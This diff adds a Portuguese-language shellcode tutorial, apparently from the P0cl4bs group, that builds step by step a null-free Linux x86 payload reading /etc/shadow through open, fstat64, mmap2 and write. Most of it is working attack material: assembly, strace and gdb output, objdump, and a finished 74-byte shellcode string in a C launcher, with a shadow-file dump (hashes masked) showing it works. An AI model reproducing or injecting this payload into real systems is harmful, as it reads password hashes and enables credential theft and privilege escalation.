@@ -1,0 +1,531 @@
+ ____   ___    ___  __    __  ____  ___ 
+(  _ \ / _ \  / __)(  )  /. |(  _ \/ __)
+ )___/( (_) )( (__  )(__(_  _)) _ <\__ \
+(__)   \___/  \___)(____) (_)(____/(___/
+
+ Autor> MMxM (@hc0d3r)
+
+ Greetz < Msfc0der, Joridos, n4sss, trinity, Cyclone, Dennis, Kodo no kami,
+        susp31t0virtual, xstpl, cooler, m0nad, Sir.Rafiki >
+
+ [[[ Escrevendo shellcode para ler conteudo de arquivo ]]]
+
+ 0x0 - Intro
+ 0x1 - Começando a construir o shellcode
+ 0x2 - fstat64
+ 0x3 - mmap2
+ 0x4 - write e close
+ 0x5 - Gerando o shellcode
+ 0x6 - Fim
+
+-------------------[[[ 0x00 Intro ]]]-------------------
+
+Hj resolvi escrever sobre como fazer um shellcode para ler o conteudo de um
+arquivo, aqui em questão é o arquivo /etc/shadow, mas você pode alterar para
+o arquivo que você desejar.
+
+Resolvi escrever esse tutorial depois de ver um shellcode no 1337day, era 
+execve('/bin//cat', ['/bin//cat','/etc/gshadow'], [0] ); , eu pensei:
+
+"Ahh usando cat fica facil, quero ver fazer sem usar execve"
+
+então eu fui la tentar sem usar execve em cat, head, tail, etc...
+já tinha na minha cabeça o que eu ia fazer >
+
+ * open ; abrir o arquivo
+ * fstat ; pegar informações do arquivo, aqui no caso so o tamanho do arquivo interessa
+ * mmap2 ; mapeia um arquivo na memoria
+ * write ; write(1, resultado_do_mmap, fstat.st_size );
+ * close ; fechar o arquivo
+
+Antes de fazer em assembly, eu fiz em C, so pra ter certeza mesmo que ia funcionar:
+
+[mmxm@hc0d3r debug]$ cat teste.c
+#include <unistd.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+int main(void){
+	int fd;
+	struct stat bufx;
+	char *x;
+
+	fd = open("teste.txt",O_RDONLY);
+
+	if(fd == -1)
+		return 1;
+
+	fstat(fd, &bufx);
+
+	x = mmap(0, bufx.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+
+	write(1, x, bufx.st_size);
+	close(fd);
+
+	return 0;
+}
+[mmxm@hc0d3r debug]$ echo x > teste.txt
+[mmxm@hc0d3r debug]$ gcc teste.c -Wall -Wextra
+[mmxm@hc0d3r debug]$ strace ./a.out
+execve("./a.out", ["./a.out"], [/* 42 vars */]) = 0
+brk(0)                                  = 0x9293000
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77d1000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=63738, ...}) = 0
+mmap2(NULL, 63738, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb77c1000
+close(3)                                = 0
+open("/lib/libc.so.6", O_RDONLY)        = 3
+read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\220n\1\0004\0\0\0"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1902892, ...}) = 0
+mmap2(NULL, 1665452, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x1d9000
+mprotect(0x369000, 4096, PROT_NONE)     = 0
+mmap2(0x36a000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x190) = 0x36a000
+mmap2(0x36d000, 10668, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x36d000
+close(3)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77c0000
+set_thread_area({entry_number:-1 -> 6, base_addr:0xb77c06c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+mprotect(0x36a000, 8192, PROT_READ)     = 0
+mprotect(0xe05000, 4096, PROT_READ)     = 0
+munmap(0xb77c1000, 63738)               = 0
+open("teste.txt", O_RDONLY)             = 3
+fstat64(3, {st_mode=S_IFREG|0664, st_size=2, ...}) = 0
+mmap2(NULL, 2, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb77d0000
+write(1, "x\n", 2x
+)                      = 2
+close(3)                                = 0
+exit_group(0)                           = ?
+
+---
+its work fine agora é so passar o programa em C pra assembly, sem nullbyte é claro :D.
+
+-------------------[[[ 0x1 - Começando a construir o shellcode ]]]-------------------
+
+Começaremos com o open, iremos executar:
+
+open("/etc//shadow", O_RDONLY);
+ __________________________________
+|__eax_|______ebx_______|___ecx____|
+| open | "/etc//shadow" | O_RDONLY |
+|__________________________________|
+
+Descobrindo o numero da system call:
+
+[mmxm@hc0d3r debug]$ cat /usr/include/asm/unistd_32.h | grep open -m1
+#define __NR_open		  5
+
+* unistd_32 pq o sistema é 32 bits.
+
+Descobrindo o valor do macro O_RDONLY:
+
+[mmxm@hc0d3r debug]$ find /usr/include -name 'fcntl.h' -type f -exec grep -H O_RDONLY {} \;
+/usr/include/bits/fcntl.h:#define O_RDONLY	     00
+/usr/include/asm-generic/fcntl.h:#define O_RDONLY	00000000
+
+O_RDONLY é 0, aqui sem muito trabalho, so zerar ecx,
+ebx não vai precisar ser zerado pq vou jogar /etc//shadow\0\0\0\0 na stack
+e depois vou copiar o endereço do esp para ebx:
+
+--- shellcode.asm
+section .text
+	global _start
+
+_start:
+xor eax, eax
+xor ecx, ecx ; zerando eax, ecx e edx, pra nao dar erro
+cdq
+
+; open
+
+mov al, 5 ; coloca em eax o numero 5 
+
+push ecx ; joga 0x00000000 na stack
+push 0x776f6461 ; escreve /etc//shadow, ao contrario, pq a stack é um sistema LIFO
+push 0x68732f2f ; LIFO = last-in first-out, primeiro a entrar ultimo a sair
+push 0x6374652f
+
+mov ebx, esp
+
+int 0x80 ; executa a system call
+
+---
+
+Compilando:
+[mmxm@hc0d3r debug]$ nasm -f elf shellcode.asm
+[mmxm@hc0d3r debug]$ ld -s -o shellcode shellcode.o
+
+Verificando se a system call open é chamada, usando o strace:
+
+[mmxm@hc0d3r debug]$ strace ./shellcode
+execve("./shellcode", ["./shellcode"], [/* 42 vars */]) = 0
+open("/etc//shadow", O_RDONLY)          = 3
+
+
+-------------------[[[ 0x2 - fstat64 ]]]-------------------
+
+Ok, agora vamos executar fstat64:
+
+int fstat(int fd, struct stat *buf);
+
+Descobrindo o numero da system call:
+
+[mmxm@hc0d3r debug]$ cat /usr/include/asm/unistd_32.h | grep fstat64
+#define __NR_fstat64		197
+
+--- shellcode.asm
+; fstat64
+
+mov ebx, eax ; move o resultado da system call open para ebx
+mov al, 197  ; fstat64
+mov ecx, esp ; move o endereço do esp para ecx
+
+int 0x80
+
+nop ; esse nop aqui é so pra ter um breakpoint, vou usar o gdb pra saber onde na stack fica o tamanho do arquivo
+---
+
+executando:
+
+[mmxm@hc0d3r debug]$ nasm -f elf shellcode.asm
+[mmxm@hc0d3r debug]$ ld -s -o shellcode shellcode.o
+[mmxm@hc0d3r debug]$ strace ./shellcode
+execve("./shellcode", ["./shellcode"], [/* 42 vars */]) = 0
+open("/etc//shadow", O_RDONLY)          = 3
+fstat64(3, {st_mode=S_IFREG|0666, st_size=1012, ...}) = 0
+
+A syscall é executada com sucesso, irei usar o nasm com a opção -g, para habilitar informação de debugger,
+e o ld sem a opção -s, pois ela tira essa informação.
+
+[mmxm@hc0d3r debug]$ nasm -f elf -g shellcode.asm
+[mmxm@hc0d3r debug]$ ld -o shellcode shellcode.o
+
+Pegando o tamanho de /etc/shadow:
+
+[mmxm@hc0d3r debug]$ stat /etc/shadow
+  File: "/etc/shadow"
+  Size: 1012      	Blocks: 8          IO Block: 4096   arquivo comum
+Device: fd00h/64768d	Inode: 654379      Links: 1
+Access: (0666/-rw-rw-rw-)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2015-05-08 17:54:06.841820259 -0300
+Modify: 2015-04-28 07:22:37.582516799 -0300
+Change: 2015-05-09 14:50:28.033809217 -0300
+
+1012 bytes, 1012 em hexadecimal = 0x3f4
+
+Debugando>>>
+
+[mmxm@hc0d3r debug]$ gdb shellcode
+GNU gdb (GDB) Red Hat Enterprise Linux (7.2-75.el6)
+Copyright (C) 2010 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-redhat-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /home/mmxm/ASM/debug/shellcode...done.
+(gdb) disas _start
+Dump of assembler code for function _start:
+   0x08048060 <+0>:	xor    %eax,%eax
+   0x08048062 <+2>:	xor    %ecx,%ecx
+   0x08048064 <+4>:	cltd   
+   0x08048065 <+5>:	mov    $0x5,%al
+   0x08048067 <+7>:	push   %ecx
+   0x08048068 <+8>:	push   $0x776f6461
+   0x0804806d <+13>:	push   $0x68732f2f
+   0x08048072 <+18>:	push   $0x6374652f
+   0x08048077 <+23>:	mov    %esp,%ebx
+   0x08048079 <+25>:	int    $0x80
+   0x0804807b <+27>:	mov    %eax,%ebx
+   0x0804807d <+29>:	mov    $0xc5,%al
+   0x0804807f <+31>:	mov    %esp,%ecx
+   0x08048081 <+33>:	int    $0x80
+   0x08048083 <+35>:	nop
+End of assembler dump.
+(gdb) b *0x08048083
+Breakpoint 1 at 0x8048083: file shellcode.asm, line 29.
+(gdb) r
+Starting program: /home/mmxm/ASM/debug/shellcode 
+
+Breakpoint 1, _start () at shellcode.asm:29
+29	nop ; esse nop aqui é so pra ter um breakpoint, e mostrar no gdb o que acontece
+(gdb) p $esp
+$1 = (void *) 0xbffff440
+(gdb) x/20x $esp
+0xbffff440:	0x0000fd00	0x00000000	0x00000000	0x0009fc2b
+0xbffff450:	0x000081b6	0x00000001	0x00000000	0x00000000
+0xbffff460:	0x00000000	0x00000000	0x00000000	0x000003f4
+0xbffff470:	0x00000000	0x00001000	0x00000008	0x00000000
+0xbffff480:	0x554d226e	0x322d2863	0x553f5f6d	0x22b8803f
+
+o tamanho do arquivo ta na terceira linha, na quarta fileira (depois de executar x/20x $esp),vamos precisar dele pra
+mmap2 e write tambem.
+
+* pode retirar o nop do arquivo shellcode.asm
+
+-------------------[[[ 0x3 - mmap2 ]]]-------------------
+
+Pegando a syscall do mmap2
+[mmxm@hc0d3r debug]$ cat /usr/include/asm/unistd_32.h | grep mmap2
+#define __NR_mmap2		192
+
+|  eax  | ebx |        ecx         |    edx    |     esi     | edi | ebp |
+| mmap2 |  0  | tamanho_do_arquivo | PROT_READ | MAP_PRIVATE | fd  |  0  |
+
+Pegando o valor dos macros PROT_READ e MAP_PRIVATE:
+
+[mmxm@hc0d3r debug]$ cat /usr/include/bits/mman.h | grep PROT_READ
+   without PROT_READ.  The only guarantees are that no writing will be
+#define PROT_READ	0x1		/* Page can be read.  */
+[mmxm@hc0d3r debug]$ cat /usr/include/bits/mman.h | grep MAP_PRIVATE
+#define MAP_PRIVATE	0x02		/* Changes are private.  */
+
+PROT_READ = 1
+MAP_PRIVATE = 2
+
+--- shellcode.asm
+; mmap2
+
+mov dword ecx, [ esp+44 ] ; 0x3f4 - tamanho do arquivo
+mov al, 192 ; mmap2 system call number
+mov edi, ebx ; move o fd pra edi
+
+xor ebx, ebx
+xor edx, edx
+xor ebp, ebp
+inc edx ; PROT_READ
+
+push byte 2 ; MAP_PRIVATE
+pop esi
+
+int 0x80
+---
+
+Executando:
+
+[mmxm@hc0d3r debug]$ ld -s -o shellcode shellcode.o
+[mmxm@hc0d3r debug]$ strace ./shellcode
+execve("./shellcode", ["./shellcode"], [/* 42 vars */]) = 0
+open("/etc//shadow", O_RDONLY)          = 3
+fstat64(3, {st_mode=S_IFREG|0666, st_size=1012, ...}) = 0
+mmap2(NULL, 1012, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb77ba000
+
+Funcionou :D.
+
+-------------------[[[ 0x4 - write e close ]]]-------------------
+
+Agora so um write, e um close de boas, e o shellcode esta pronto.
+
+write(1, ptr, size);
+close(fd);
+
+---shellcode.asm
+
+; write
+
+mov edx, ecx ; tamanho do arquivo em edx
+mov ecx, eax ; move o resultado de mmap2 para ecx
+
+xor eax, eax
+mov al, 4; sys_write
+inc ebx; 1 = stdout
+
+int 0x80
+
+; close
+
+xor eax, eax
+mov al, 6; sys_close
+mov ebx, edi
+
+int 0x80
+
+---
+
+Executando:
+
+[mmxm@hc0d3r debug]$ strace ./shellcode
+execve("./shellcode", ["./shellcode"], [/* 27 vars */]) = 0
+open("/etc//shadow", O_RDONLY)          = 3
+fstat64(3, {st_mode=S_IFREG|0666, st_size=1012, ...}) = 0
+mmap2(NULL, 1012, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb77df000
+write(1, "root:AAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 1012root:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:16438:0:99999:7:::
+bin:*:15980:0:99999:7:::
+daemon:*:15980:0:99999:7:::
+adm:*:15980:0:99999:7:::
+lp:*:15980:0:99999:7:::
+sync:*:15980:0:99999:7:::
+shutdown:*:15980:0:99999:7:::
+halt:*:15980:0:99999:7:::
+mail:*:15980:0:99999:7:::
+uucp:*:15980:0:99999:7:::
+operator:*:15980:0:99999:7:::
+games:*:15980:0:99999:7:::
+gopher:*:15980:0:99999:7:::
+ftp:*:15980:0:99999:7:::
+nobody:*:15980:0:99999:7:::
+vcsa:!!:16438::::::
+saslauth:!!:16438::::::
+postfix:!!:16438::::::
+sshd:!!:16438::::::
+dbus:!!:16438::::::
+ntp:!!:16438::::::
+rtkit:!!:16438::::::
+pulse:!!:16438::::::
+avahi-autoipd:!!:16438::::::
+haldaemon:!!:16438::::::
+gdm:!!:16438::::::
+mmxm:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:16438:0:99999:7:::
+usbmuxd:!!:16438::::::
+apache:!!:16438::::::
+vboxadd:!!:16439::::::
+tcpdump:!!:16439::::::
+toranon:!!:16440::::::
+mysql:!!:16553::::::
+) = 1012
+close(3)                                = 0
+
+-------------------[[[ 0x5 - Gerando o shellcode ]]]-------------------
+
+Conteudo total do arquivo shellcode.asm:
+
+[mmxm@hc0d3r debug]$ cat shellcode.asm
+section .text
+	global _start
+
+_start:
+
+; open
+
+xor eax, eax
+xor ecx, ecx ; zerando eax, ecx e edx, pra nao dar erro
+cdq
+
+mov al, 5 ; coloca em eax o numero 5
+
+push ecx ; joga 0x00000000 na stack
+push 0x776f6461 ; escreve /etc//shadow, ao contrario, pq a stack é um sistema LIFO
+push 0x68732f2f ; LIFO = last-in first-out, primeiro a entrar ultimo a sair
+push 0x6374652f
+
+mov ebx, esp
+
+int 0x80 ; executa a system call
+
+; fstat64
+
+mov ebx, eax ; move o resultado da system call open para ebx
+mov al, 197  ; fstat64
+mov ecx, esp ; move o endereço do esp para ecx
+
+int 0x80
+
+; mmap2
+
+mov dword ecx, [ esp+44 ] ; 0x3f4 - tamanho do arquivo
+mov al,	192 ; mmap2 system call	number
+mov edi, ebx ; move o fd pra edi
+
+xor ebx, ebx
+xor edx, edx
+xor ebp, ebp
+inc edx ; PROT_READ
+
+push byte 2 ; MAP_PRIVATE
+pop esi
+
+int 0x80
+
+; write
+
+mov edx, ecx ; tamanho do arquivo em edx
+mov ecx, eax ; move o resultado de mmap2 para ecx
+
+xor eax, eax
+mov al, 4; sys_write
+inc ebx; 1 = stdout
+
+int 0x80
+
+; close
+
+xor eax, eax
+mov al, 6; sys_close
+mov ebx, edi
+
+int 0x80
+
+[mmxm@hc0d3r debug]$ objdump -d shellcode
+
+shellcode:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <.text>:
+ 8048060:	31 c0                	xor    %eax,%eax
+ 8048062:	31 c9                	xor    %ecx,%ecx
+ 8048064:	99                   	cltd   
+ 8048065:	b0 05                	mov    $0x5,%al
+ 8048067:	51                   	push   %ecx
+ 8048068:	68 61 64 6f 77       	push   $0x776f6461
+ 804806d:	68 2f 2f 73 68       	push   $0x68732f2f
+ 8048072:	68 2f 65 74 63       	push   $0x6374652f
+ 8048077:	89 e3                	mov    %esp,%ebx
+ 8048079:	cd 80                	int    $0x80
+ 804807b:	89 c3                	mov    %eax,%ebx
+ 804807d:	b0 c5                	mov    $0xc5,%al
+ 804807f:	89 e1                	mov    %esp,%ecx
+ 8048081:	cd 80                	int    $0x80
+ 8048083:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
+ 8048087:	b0 c0                	mov    $0xc0,%al
+ 8048089:	89 df                	mov    %ebx,%edi
+ 804808b:	31 db                	xor    %ebx,%ebx
+ 804808d:	31 d2                	xor    %edx,%edx
+ 804808f:	31 ed                	xor    %ebp,%ebp
+ 8048091:	42                   	inc    %edx
+ 8048092:	6a 02                	push   $0x2
+ 8048094:	5e                   	pop    %esi
+ 8048095:	cd 80                	int    $0x80
+ 8048097:	89 ca                	mov    %ecx,%edx
+ 8048099:	89 c1                	mov    %eax,%ecx
+ 804809b:	31 c0                	xor    %eax,%eax
+ 804809d:	b0 04                	mov    $0x4,%al
+ 804809f:	43                   	inc    %ebx
+ 80480a0:	cd 80                	int    $0x80
+ 80480a2:	31 c0                	xor    %eax,%eax
+ 80480a4:	b0 06                	mov    $0x6,%al
+ 80480a6:	89 fb                	mov    %edi,%ebx
+ 80480a8:	cd 80                	int    $0x80
+[mmxm@hc0d3r debug]$ cat read_etc_shadow.c
+/*
+Reading /etc/shadow linux/x86 (74 bytes)
+Author: MMxM (@hc0d3r)
+Sáb Mai  9 16:54:36 BRT 2015
+*/
+
+
+#include <stdio.h>
+
+unsigned const char sc[]=
+	"\x31\xc0\x31\xc9\x99\xb0\x05\x51\x68\x61\x64\x6f\x77\x68"
+	"\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\x89"
+	"\xc3\xb0\xc5\x89\xe1\xcd\x80\x8b\x4c\x24\x2c\xb0\xc0\x89"
+	"\xdf\x31\xdb\x31\xd2\x31\xed\x42\x6a\x02\x5e\xcd\x80\x89"
+	"\xca\x89\xc1\x31\xc0\xb0\x04\x43\xcd\x80\x31\xc0\xb0\x06"
+	"\x89\xfb\xcd\x80";
+
+int main(void){
+	__asm__("jmp sc");
+	return 0;
+}
+
+-------------------[[[ 0x6 - Fim ]]]-------------------
+
+Com pequenas modificações você pode usar o mesmo codigo para copiar/mover arquivos.
+É isso ai, tchau.
+
+P0cl4bs team.
